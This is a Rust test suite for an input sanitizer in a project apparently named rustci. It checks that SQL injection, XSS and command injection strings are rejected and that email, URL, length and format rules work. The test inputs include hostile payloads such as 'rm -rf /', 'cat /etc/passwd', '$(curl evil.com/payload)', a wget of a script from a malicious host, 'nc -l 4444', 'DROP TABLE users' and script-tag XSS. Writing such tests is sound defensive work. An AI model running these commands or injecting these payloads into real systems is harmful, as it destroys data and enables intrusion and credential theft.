//! Comprehensive tests for input sanitizer
//!
//! This module contains security tests for input validation and sanitization
//! to ensure protection against injection attacks.

use rustci::core::security::input_sanitizer::{
    InputSanitizer, InputSanitizerConfig, ValidationRule, RiskLevel, ViolationSeverity
};
use rustci::error::AppError;

#[tokio::test]
async fn test_sql_injection_detection() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::SqlInjection];

    // Test various SQL injection patterns
    let malicious_inputs = vec![
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "1; DELETE FROM users WHERE 1=1",
        "UNION SELECT * FROM passwords",
        "' OR 1=1 /*",
        "'; EXEC xp_cmdshell('dir'); --",
    ];

    for input in malicious_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(!result.is_valid, "Should detect SQL injection in: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Critical);
        assert!(!result.violations.is_empty());
        assert_eq!(result.violations[0].severity, ViolationSeverity::Critical);
    }

    // Test safe inputs
    let safe_inputs = vec![
        "john.doe@example.com",
        "Hello World",
        "Product Name 123",
        "Valid user input",
    ];

    for input in safe_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(result.is_valid, "Should accept safe input: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Low);
        assert!(result.violations.is_empty());
    }
}

#[tokio::test]
async fn test_xss_protection() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::XssProtection];

    // Test XSS attack patterns
    let xss_inputs = vec![
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<object data='javascript:alert(1)'></object>",
        "<embed src='javascript:alert(1)'>",
        "<link rel='stylesheet' href='javascript:alert(1)'>",
        "javascript:alert('XSS')",
        "vbscript:alert('XSS')",
        "<img src='x' onload='alert(1)'>",
        "data:text/html,<script>alert(1)</script>",
    ];

    for input in xss_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(!result.is_valid, "Should detect XSS in: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Critical);
        assert!(!result.violations.is_empty());
        
        // Check that sanitized output is HTML encoded
        if let Some(sanitized) = &result.sanitized_input {
            assert!(!sanitized.contains('<'));
            assert!(!sanitized.contains('>'));
        }
    }

    // Test safe HTML-like content
    let safe_inputs = vec![
        "This is &lt;safe&gt; content",
        "Email: user@domain.com",
        "Price: $19.99",
        "Normal text content",
    ];

    for input in safe_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(result.is_valid, "Should accept safe input: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Low);
    }
}

#[tokio::test]
async fn test_command_injection_protection() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::CommandInjection];

    // Test command injection patterns
    let command_inputs = vec![
        "file.txt; rm -rf /",
        "input | cat /etc/passwd",
        "data && wget malicious.com/script.sh",
        "$(curl evil.com/payload)",
        "`rm -rf /`",
        "file.txt & nc -l 4444",
        "input > /dev/null; chmod +x malware",
        "/bin/bash -c 'malicious command'",
        "cmd.exe /c dir",
        "powershell -Command 'Get-Process'",
    ];

    for input in command_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(!result.is_valid, "Should detect command injection in: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Critical);
        assert!(!result.violations.is_empty());
    }

    // Test safe inputs
    let safe_inputs = vec![
        "filename.txt",
        "user input data",
        "configuration value",
        "normal-file-name.json",
    ];

    for input in safe_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(result.is_valid, "Should accept safe input: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Low);
    }
}

#[tokio::test]
async fn test_email_validation() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::Email];

    // Test valid emails
    let valid_emails = vec![
        "user@example.com",
        "test.email@domain.org",
        "user+tag@example.co.uk",
        "firstname.lastname@company.com",
    ];

    for email in valid_emails {
        let result = sanitizer.validate_and_sanitize(email, &rules).unwrap();
        assert!(result.is_valid, "Should accept valid email: {}", email);
        assert_eq!(result.risk_level, RiskLevel::Low);
    }

    // Test invalid emails
    let invalid_emails = vec![
        "invalid-email",
        "@domain.com",
        "user@",
        "user@domain",
        "user space@domain.com",
        "user@domain..com",
    ];

    for email in invalid_emails {
        let result = sanitizer.validate_and_sanitize(email, &rules).unwrap();
        assert!(!result.is_valid, "Should reject invalid email: {}", email);
        assert_eq!(result.risk_level, RiskLevel::Medium);
    }
}

#[tokio::test]
async fn test_url_validation() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::Url];

    // Test valid URLs
    let valid_urls = vec![
        "https://example.com",
        "http://domain.org/path",
        "https://sub.domain.com/path?query=value",
        "http://localhost:8080/api/v1/endpoint",
    ];

    for url in valid_urls {
        let result = sanitizer.validate_and_sanitize(url, &rules).unwrap();
        assert!(result.is_valid, "Should accept valid URL: {}", url);
        assert_eq!(result.risk_level, RiskLevel::Low);
    }

    // Test invalid URLs
    let invalid_urls = vec![
        "not-a-url",
        "ftp://example.com",
        "javascript:alert(1)",
        "data:text/html,content",
        "file:///etc/passwd",
    ];

    for url in invalid_urls {
        let result = sanitizer.validate_and_sanitize(url, &rules).unwrap();
        assert!(!result.is_valid, "Should reject invalid URL: {}", url);
        assert_eq!(result.risk_level, RiskLevel::Medium);
    }
}

#[tokio::test]
async fn test_length_validation() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::Length { min: 5, max: 20 }];

    // Test valid lengths
    let valid_inputs = vec![
        "12345",      // exactly min
        "1234567890", // middle
        "12345678901234567890", // exactly max
    ];

    for input in valid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(result.is_valid, "Should accept valid length: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Low);
    }

    // Test invalid lengths
    let invalid_inputs = vec![
        "1234",     // too short
        "123456789012345678901", // too long
        "",         // empty
    ];

    for input in invalid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(!result.is_valid, "Should reject invalid length: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Medium);
    }
}

#[tokio::test]
async fn test_required_validation() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::Required];

    // Test valid inputs
    let valid_inputs = vec![
        "content",
        "  trimmed  ",
        "a",
    ];

    for input in valid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(result.is_valid, "Should accept non-empty input: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Low);
    }

    // Test invalid inputs
    let invalid_inputs = vec![
        "",
        "   ",
        "\t\n",
    ];

    for input in invalid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(!result.is_valid, "Should reject empty input: '{}'", input);
        assert_eq!(result.risk_level, RiskLevel::Medium);
    }
}

#[tokio::test]
async fn test_whitelist_validation() {
    let sanitizer = InputSanitizer::new().unwrap();
    let allowed_values = vec!["admin".to_string(), "user".to_string(), "guest".to_string()];
    let rules = vec![ValidationRule::Whitelist { allowed_values }];

    // Test valid inputs
    let valid_inputs = vec!["admin", "user", "guest"];

    for input in valid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(result.is_valid, "Should accept whitelisted value: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Low);
    }

    // Test invalid inputs
    let invalid_inputs = vec!["root", "superuser", "anonymous", ""];

    for input in invalid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(!result.is_valid, "Should reject non-whitelisted value: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Medium);
    }
}

#[tokio::test]
async fn test_custom_regex_validation() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::CustomRegex {
        pattern: r"^[A-Z]{2,3}-\d{4}$".to_string(),
        description: "Country code format".to_string(),
    }];

    // Test valid inputs
    let valid_inputs = vec!["US-1234", "UK-5678", "CAN-9999"];

    for input in valid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(result.is_valid, "Should accept valid format: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Low);
    }

    // Test invalid inputs
    let invalid_inputs = vec!["us-1234", "US-123", "US1234", "INVALID"];

    for input in invalid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(!result.is_valid, "Should reject invalid format: {}", input);
        assert_eq!(result.risk_level, RiskLevel::Medium);
    }
}

#[tokio::test]
async fn test_multiple_rules_validation() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![
        ValidationRule::Required,
        ValidationRule::Length { min: 5, max: 50 },
        ValidationRule::SqlInjection,
        ValidationRule::XssProtection,
    ];

    // Test input that passes all rules
    let valid_input = "Valid user input content";
    let result = sanitizer.validate_and_sanitize(valid_input, &rules).unwrap();
    assert!(result.is_valid);
    assert_eq!(result.risk_level, RiskLevel::Low);
    assert!(result.violations.is_empty());

    // Test input that fails multiple rules
    let malicious_input = "'; DROP TABLE users; <script>alert('XSS')</script>";
    let result = sanitizer.validate_and_sanitize(malicious_input, &rules).unwrap();
    assert!(!result.is_valid);
    assert_eq!(result.risk_level, RiskLevel::Critical);
    assert!(result.violations.len() >= 2); // Should detect both SQL injection and XSS
}

#[tokio::test]
async fn test_sanitizer_configuration() {
    let config = InputSanitizerConfig {
        strict_mode: false,
        auto_sanitize: true,
        log_violations: false,
        max_input_length: 100,
        custom_patterns: std::collections::HashMap::new(),
    };

    let sanitizer = InputSanitizer::with_config(config).unwrap();
    let rules = vec![ValidationRule::XssProtection];

    // In non-strict mode, should still sanitize but not reject
    let xss_input = "<script>alert('test')</script>";
    let result = sanitizer.validate_and_sanitize(xss_input, &rules).unwrap();
    
    // Should have violations but might still be considered "valid" in non-strict mode
    assert!(!result.violations.is_empty());
    assert!(result.sanitized_input.is_some());
    
    // Sanitized output should be HTML encoded
    let sanitized = result.sanitized_input.unwrap();
    assert!(!sanitized.contains('<'));
    assert!(!sanitized.contains('>'));
}

#[tokio::test]
async fn test_max_input_length() {
    let config = InputSanitizerConfig {
        max_input_length: 10,
        ..Default::default()
    };

    let sanitizer = InputSanitizer::with_config(config).unwrap();
    let rules = vec![ValidationRule::Required];

    // Test input exceeding max length
    let long_input = "This input is definitely longer than 10 characters";
    let result = sanitizer.validate_and_sanitize(long_input, &rules).unwrap();
    
    assert!(!result.is_valid);
    assert_eq!(result.risk_level, RiskLevel::High);
    assert!(!result.violations.is_empty());
    assert_eq!(result.violations[0].rule, "MaxLength");
}

#[tokio::test]
async fn test_alphanumeric_validation() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::Alphanumeric];

    // Test valid alphanumeric inputs
    let valid_inputs = vec!["abc123", "ABC", "123", "Test123"];

    for input in valid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(result.is_valid, "Should accept alphanumeric: {}", input);
    }

    // Test invalid inputs
    let invalid_inputs = vec!["abc-123", "test@domain", "hello world", "test!"];

    for input in invalid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(!result.is_valid, "Should reject non-alphanumeric: {}", input);
        
        // Should provide sanitized version with only alphanumeric characters
        if let Some(sanitized) = result.sanitized_input {
            assert!(sanitized.chars().all(|c| c.is_alphanumeric()));
        }
    }
}

#[tokio::test]
async fn test_numeric_validation() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::Numeric];

    // Test valid numeric inputs
    let valid_inputs = vec!["123", "0", "999999"];

    for input in valid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(result.is_valid, "Should accept numeric: {}", input);
    }

    // Test invalid inputs
    let invalid_inputs = vec!["abc", "12.34", "1a2b3c", "-123"];

    for input in invalid_inputs {
        let result = sanitizer.validate_and_sanitize(input, &rules).unwrap();
        assert!(!result.is_valid, "Should reject non-numeric: {}", input);
        
        // Should provide sanitized version with only numeric characters
        if let Some(sanitized) = result.sanitized_input {
            assert!(sanitized.chars().all(|c| c.is_numeric()) || sanitized.is_empty());
        }
    }
}

#[tokio::test]
async fn test_html_encoding() {
    let sanitizer = InputSanitizer::new().unwrap();
    let rules = vec![ValidationRule::XssProtection];

    let input_with_html = "<div>Hello & \"World\"</div>";
    let result = sanitizer.validate_and_sanitize(input_with_html, &rules).unwrap();
    
    if let Some(sanitized) = result.sanitized_input {
        assert!(sanitized.contains("&lt;"));
        assert!(sanitized.contains("&gt;"));
        assert!(sanitized.contains("&amp;"));
        assert!(sanitized.contains("&quot;"));
    }
}

#[tokio::test]
async fn test_error_handling() {
    let sanitizer = InputSanitizer::new().unwrap();
    
    // Test invalid regex pattern
    let invalid_regex_rule = ValidationRule::CustomRegex {
        pattern: "[invalid regex(".to_string(),
        description: "Invalid pattern".to_string(),
    };
    
    let result = sanitizer.validate_and_sanitize("test", &[invalid_regex_rule]);
    assert!(result.is_err());
    
    match result {
        Err(AppError::ValidationError(_)) => {}, // Expected
        _ => panic!("Expected ValidationError for invalid regex"),
    }
}